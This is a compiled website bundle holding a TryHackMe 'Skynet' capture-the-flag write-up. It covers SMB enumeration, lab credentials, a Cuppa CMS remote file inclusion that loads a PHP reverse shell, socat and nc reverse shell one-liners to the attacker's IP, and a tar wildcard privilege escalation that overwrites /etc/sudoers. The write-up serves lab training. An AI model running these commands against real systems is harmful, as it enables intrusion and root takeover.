"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[297],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return m}});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},u=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,i=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=p(t),m=o,h=d["".concat(l,".").concat(m)]||d[m]||c[m]||i;return t?r.createElement(h,a(a({ref:n},u),{},{components:t})):r.createElement(h,a({ref:n},u))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var i=t.length,a=new Array(i);a[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s.mdxType="string"==typeof e?e:o,a[1]=s;for(var p=2;p<i;p++)a[p]=t[p];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},8526:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return u},default:function(){return d}});var r=t(7462),o=t(3366),i=(t(7294),t(3905)),a=["components"],s={},l=void 0,p={unversionedId:"Cibersecurity/Writeups/SKYNET THM{}",id:"Cibersecurity/Writeups/SKYNET THM{}",title:"SKYNET THM{}",description:"IP: 10.10.182.131",source:"@site/docs/Cibersecurity/Writeups/SKYNET THM{}.md",sourceDirName:"Cibersecurity/Writeups",slug:"/Cibersecurity/Writeups/SKYNET THM{}",permalink:"/docs/Cibersecurity/Writeups/SKYNET THM{}",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Writeups/SKYNET THM{}.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Retro THM{}",permalink:"/docs/Cibersecurity/Writeups/Retro THM{}"},next:{title:"Docusaurus-configuration",permalink:"/docs/Configurations/Docusaurus-configuration"}},u=[{value:"NMAP",id:"nmap",children:[],level:2},{value:"SMB",id:"smb",children:[{value:"Enumeration",id:"enumeration",children:[],level:3},{value:"Connect to the anonymous share",id:"connect-to-the-anonymous-share",children:[],level:3}],level:2},{value:"Webpage",id:"webpage",children:[{value:"Gobuster",id:"gobuster",children:[],level:3},{value:"Squirrelmail",id:"squirrelmail",children:[],level:3},{value:"milesdyson share",id:"milesdyson-share",children:[],level:3},{value:"Gobuster with new page",id:"gobuster-with-new-page",children:[],level:3}],level:2},{value:"Cuppa CMS",id:"cuppa-cms",children:[{value:"Improve shell",id:"improve-shell",children:[],level:3},{value:"Linpeas",id:"linpeas",children:[],level:3}],level:2}],c={toc:u};function d(e){var n=e.components,t=(0,o.Z)(e,a);return(0,i.kt)("wrapper",(0,r.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"IP: 10.10.182.131\nUsing Hacktricks to find information, this is the followed procedure:"),(0,i.kt)("h2",{id:"nmap"},"NMAP"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"nmap -A -sC -T4 10.10.182.131 ")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 03:59 EDT\nNmap scan report for 10.10.182.131\nHost is up (0.080s latency).\nNot shown: 994 closed tcp ports (conn-refused)\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)\n|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)\n|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)\n80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Skynet\n110/tcp open  pop3        Dovecot pop3d\n|_pop3-capabilities: RESP-CODES SASL AUTH-RESP-CODE CAPA UIDL PIPELINING TOP\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp open  imap        Dovecot imapd\n|_imap-capabilities: have capabilities more listed SASL-IR Pre-login IMAP4rev1 post-login IDLE LOGINDISABLEDA0001 ID ENABLE LOGIN-REFERRALS LITERAL+ OK\n445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\nService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s\n|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-time: \n|   date: 2022-03-21T07:59:35\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: skynet\n|   NetBIOS computer name: SKYNET\\x00\n|   Domain name: \\x00\n|   FQDN: skynet\n|_  System time: 2022-03-21T02:59:35-05:00\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.11 seconds\n\n")),(0,i.kt)("p",null,"We find interesting, a webpage and a smb service."),(0,i.kt)("h2",{id:"smb"},"SMB"),(0,i.kt)("h3",{id:"enumeration"},"Enumeration"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"enum4linux -a 10.10.182.131")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"}," ===================================================== \n|    Enumerating Workgroup/Domain on 10.10.182.131    |\n ===================================================== \n[+] Got domain/workgroup name: WORKGROUP\n\n ============================================= \n|    Nbtstat Information for 10.10.182.131    |\n ============================================= \nLooking up status of 10.10.182.131\n        SKYNET          <00> -         B <ACTIVE>  Workstation Service\n        SKYNET          <03> -         B <ACTIVE>  Messenger Service\n        SKYNET          <20> -         B <ACTIVE>  File Server Service\n        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser\n        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser\n        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections\n\n        MAC Address = 00-00-00-00-00-00\n\n ======================================= \n|    OS information on 10.10.182.131    |\n ======================================= \nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for 10.10.182.131 from smbclient: \n[+] Got OS info for 10.10.182.131 from srvinfo:\n        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n        \n ============================== \n|    Users on 10.10.182.131    |\n ============================== \nindex: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: \n\nuser:[milesdyson] rid:[0x3e8]\n\n ========================================== \n|    Share Enumeration on 10.10.182.131    |\n ========================================== \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        anonymous       Disk      Skynet Anonymous Share\n        milesdyson      Disk      Miles Dyson Personal Share\n        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            SKYNET\n        \n    [+] Attempting to map shares on 10.10.182.131\n//10.10.182.131/print$  Mapping: DENIED, Listing: N/A\n//10.10.182.131/anonymous       Mapping: OK, Listing: OK\n//10.10.182.131/milesdyson      Mapping: DENIED, Listing: N/A\n//10.10.182.131/IPC$    [E] Can't understand response:\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n")),(0,i.kt)("p",null,"The sare enumeration is very interesting, lets try connect to any shared folder."),(0,i.kt)("h3",{id:"connect-to-the-anonymous-share"},"Connect to the anonymous share"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"smbclient -U '%' -N \\\\\\\\10.10.182.131\\\\anonymous ")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"smb: \\> dir\n  .                                   D        0  Thu Nov 26 11:04:00 2020\n  ..                                  D        0  Tue Sep 17 03:20:17 2019\n  attention.txt                       N      163  Tue Sep 17 23:04:59 2019\n  logs                                D        0  Wed Sep 18 00:42:16 2019\n")),(0,i.kt)("p",null,"We obtained a file called log1.txt with different passwords. Lets try them on the webpage with the user milesdyson."),(0,i.kt)("h2",{id:"webpage"},"Webpage"),(0,i.kt)("h3",{id:"gobuster"},"Gobuster"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"gobuster dir -u http://10.10.182.131  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"),"                  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.182.131\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/03/21 04:13:57 Starting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 314] [--\x3e http://10.10.182.131/admin/]\n/css                  (Status: 301) [Size: 312] [--\x3e http://10.10.182.131/css/]  \n/js                   (Status: 301) [Size: 311] [--\x3e http://10.10.182.131/js/]   \n/config               (Status: 301) [Size: 315] [--\x3e http://10.10.182.131/config/]\n/ai                   (Status: 301) [Size: 311] [--\x3e http://10.10.182.131/ai/]    \n/squirrelmail         (Status: 301) [Size: 321] [--\x3e http://10.10.182.131/squirrelmail/]\n")),(0,i.kt)("p",null,"After trying the different folders, it's possible to visit /squirrelmail. We can try the above credentials with the username milesdyson here."),(0,i.kt)("h3",{id:"squirrelmail"},"Squirrelmail"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"<IP>/squirrelmail"),"\nuser: milesdyson\npass: cyborg007haloterminator"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Subject:    Samba Password reset\nFrom:       skynet@skynet\nDate:       Tue, September 17, 2019 10:10 pm\nPriority:       Normal\nOptions:    View Full Header |  View Printable Version  | Download this as a file\n\nWe have changed your smb password after system malfunction.\nPassword: )s{A&2Z=F^n_E.B`\n")),(0,i.kt)("p",null,"So now we can try this password in the /milesdyson share."),(0,i.kt)("h3",{id:"milesdyson-share"},"milesdyson share"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"smbclient -U 'milesdyson' \\\\\\\\10.10.182.131\\\\milesdyson"),"\nWe are prompted for the password."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"smb: \\notes\\> dir\n  .                                   D        0  Tue Sep 17 05:18:40 2019\n  ..                                  D        0  Tue Sep 17 05:05:47 2019\n  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019\n  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019\n  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019\n  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019\n  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019\n  important.txt                       N      117  Tue Sep 17 05:18:39 2019\n")),(0,i.kt)("p",null,"Tere is a file called important.txt with a secret folder in the webserver."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"\u2514\u2500$ cat important.txt \n1. Add features to beta CMS /45kra24zxs28v3yd\n2. Work on T-800 Model 101 blueprints\n3. Spend more time with my wife\n")),(0,i.kt)("h3",{id:"gobuster-with-new-page"},"Gobuster with new page"),(0,i.kt)("p",null,"We do gobuster over the hidden directory."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"gobuster dir -u http://10.10.247.90/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                                                                 2 \u2a2f\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.247.90/45kra24zxs28v3yd/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/03/21 09:46:30 Starting gobuster in directory enumeration mode\n===============================================================\n/administrator        (Status: 301) [Size: 337] [--\x3e http://10.10.247.90/45kra24zxs28v3yd/administrator/\n")),(0,i.kt)("h2",{id:"cuppa-cms"},"Cuppa CMS"),(0,i.kt)("p",null,"After finding this CMS version, an exploit for RFI is founded on exploit db.\nOn the local machine, we start a python server with the ",(0,i.kt)("a",{parentName:"p",href:"https://pentestmonkey.net/tools/web-shells/php-reverse-shell"},"Pestentmonkey php script"),".\n",(0,i.kt)("inlineCode",{parentName:"p"},"python3 -m http.server 8000"),"\nAnd also a listened with the local IP and the port preconfigured in the payload.\n",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp 5555  "),"\nNow we use that in our browser\n",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.85.87/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.13.133:8000/shell.php"),"\nAnd we obtain the shell"),(0,i.kt)("h3",{id:"improve-shell"},"Improve shell"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Improve shell with python pty module ",(0,i.kt)("inlineCode",{parentName:"li"},"python -c 'import pty; pty.spawn(\"/bin/bash\")'")),(0,i.kt)("li",{parentName:"ol"},"Improve shell with socat\n2.1 Download socat and serve on a python server on the local machine\n",(0,i.kt)("inlineCode",{parentName:"li"},"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"),"\n2.2 Create a listening conexion on our local machine\n",(0,i.kt)("inlineCode",{parentName:"li"},"socat file:"),"tty",(0,i.kt)("inlineCode",{parentName:"li"},",raw,echo=0 tcp-listen:4444"),"\n2.3 execute it on the remote machine\n",(0,i.kt)("inlineCode",{parentName:"li"},"wget http://10.11.62.63:8000/socat  -O /tmp/socat; chmod +x /tmp/socat; ./tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.11.62.63:4444"))),(0,i.kt)("h3",{id:"linpeas"},"Linpeas"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Download linpeas.sh on local machine\n",(0,i.kt)("inlineCode",{parentName:"li"},"wget https://github.com/carlospolop/PEASS-ng/releases/download/20220320/linpeas.sh")),(0,i.kt)("li",{parentName:"ol"},"Serve it on the python server and download it on the remote machine"),(0,i.kt)("li",{parentName:"ol"},"After using linpeas, we found a cronjob with tar")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"*/1 *   * * *   root    /home/milesdyson/backups/backup.sh\n")),(0,i.kt)("p",null,"Now we read de backup.sh"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"#!/bin/bash\ncd /var/www/html\ntar cf /home/milesdyson/backups/backup.tgz *\n")),(0,i.kt)("p",null,"So, taking into account the Wildcards of tar, we can exploit it. We can use this command"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.62.63 6666 >/tmp/f" > shell.sh touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" touch "/var/www/html/--checkpoint=1"\n')),(0,i.kt)("p",null,"There is more information about tar wildcards here ",(0,i.kt)("a",{parentName:"p",href:"https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/"},"Exploiting wildcards on Linux")),(0,i.kt)("p",null,"And do the following"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'echo \'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers\' > privesc.sh\necho "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"\necho "/var/www/html"  > --checkpoint=1\n')),(0,i.kt)("p",null,"And now we are able to do ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo cat /root/root.txt"),"."))}d.isMDXComponent=!0}}]);